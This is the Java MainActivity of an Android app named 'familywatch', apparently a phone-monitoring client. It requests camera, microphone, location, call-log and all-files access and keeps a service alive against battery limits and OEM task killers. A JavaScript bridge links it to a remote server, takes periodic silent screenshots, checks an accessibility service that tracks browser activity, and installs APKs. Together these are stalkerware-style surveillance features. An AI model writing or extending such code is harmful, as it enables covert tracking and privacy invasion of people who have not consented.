package com.familywatch.app;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import com.getcapacitor.BridgeActivity;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class MainActivity extends BridgeActivity {

    private static final int REQ_MEDIA_PROJECTION = 1001;
    private static final int REQ_PERMISSIONS      = 1002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestAllFilesAccess();
        requestBatteryOptimizationExemption();
        requestRuntimePermissions();
        startKeepAlive();
        scheduleWorkManagerRestart();
        registerNativeBridge();
    }

    private void requestRuntimePermissions() {
        String[] needed = {
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_CALL_LOG",
        };
        java.util.List<String> toRequest = new java.util.ArrayList<>();
        for (String p : needed) {
            if (ContextCompat.checkSelfPermission(this, p) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), REQ_PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            // Re-start service so startForeground picks up newly granted types
            startKeepAlive();
        }
    }

    @Override
    public void onPause() {
        super.onPause();
        WebView webView = getBridge() != null ? getBridge().getWebView() : null;
        if (webView != null) webView.resumeTimers();
    }

    @Override
    public void onStop() {
        super.onStop();
        WebView webView = getBridge() != null ? getBridge().getWebView() : null;
        if (webView != null) webView.resumeTimers();
    }

    // ── Battery optimization exemption — allows network in Doze mode ──────────
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName())
                );
                startActivity(intent);
            }
        }
    }

    // ── JavaScript interface so React can pass credentials to native ───────────
    private void registerNativeBridge() {
        WebView webView = getBridge() != null ? getBridge().getWebView() : null;
        if (webView != null) {
            webView.addJavascriptInterface(new MeeeeNative(), "MeeeeNative");
        }
    }

    class MeeeeNative {
        @JavascriptInterface
        public void connect(String serverUrl, String name) {
            getSharedPreferences("meeee", Context.MODE_PRIVATE)
                .edit()
                .putString("serverUrl", serverUrl)
                .putString("name", name)
                .apply();

            Intent svc = new Intent(MainActivity.this, KeepAliveService.class);
            svc.setAction("CONNECT");
            svc.putExtra("serverUrl", serverUrl);
            svc.putExtra("name", name);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(MainActivity.this, svc);
            } else {
                startService(svc);
            }
        }

        @JavascriptInterface
        public void requestScreenCapture() {
            // Shows the system "Start recording?" dialog exactly once per call.
            // After user taps "Start now", onActivityResult fires and passes the
            // token to KeepAliveService which captures silently every 3 minutes.
            MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION);
            }
        }

        @JavascriptInterface
        public boolean isAccessibilityServiceEnabled() {
            String flat = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
            return flat != null && flat.contains(getPackageName() + "/" + getPackageName() + ".BrowserActivityAccessibilityService");
        }

        @JavascriptInterface
        public void openAccessibilitySettings() {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }

        @JavascriptInterface
        public void installApk(String filePath) {
            File file = new File(filePath);
            Uri apkUri = FileProvider.getUriForFile(MainActivity.this, getPackageName() + ".fileprovider", file);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        @JavascriptInterface
        public void disconnect() {
            // Clear saved credentials so service doesn't reconnect
            getSharedPreferences("meeee", Context.MODE_PRIVATE)
                .edit()
                .remove("serverUrl")
                .remove("name")
                .apply();

            Intent svc = new Intent(MainActivity.this, KeepAliveService.class);
            svc.setAction("DISCONNECT");
            startService(svc);
        }
    }

    // ── MediaProjection result → pass token to running service ───────────────
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK && data != null) {
            Intent svc = new Intent(this, KeepAliveService.class);
            svc.setAction("START_SCREEN_CAPTURE");
            svc.putExtra("resultCode", resultCode);
            svc.putExtra("data", data);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(this, svc);
            } else {
                startService(svc);
            }
        }
    }

    // ── Permissions & service startup ─────────────────────────────────────────
    private void requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName())
                );
                startActivity(intent);
            }
        }
    }

    private void startKeepAlive() {
        Intent svc = new Intent(this, KeepAliveService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, svc);
        } else {
            startService(svc);
        }
    }

    // WorkManager periodic job — fires every 15 min even on aggressive OEMs (Samsung/Xiaomi)
    // because it runs via the system's JobScheduler, which OEMs cannot kill
    private void scheduleWorkManagerRestart() {
        PeriodicWorkRequest restartWork = new PeriodicWorkRequest.Builder(
            ServiceRestartWorker.class, 15, TimeUnit.MINUTES)
            .build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "keepalive_restart",
            ExistingPeriodicWorkPolicy.KEEP,
            restartWork);
    }
}
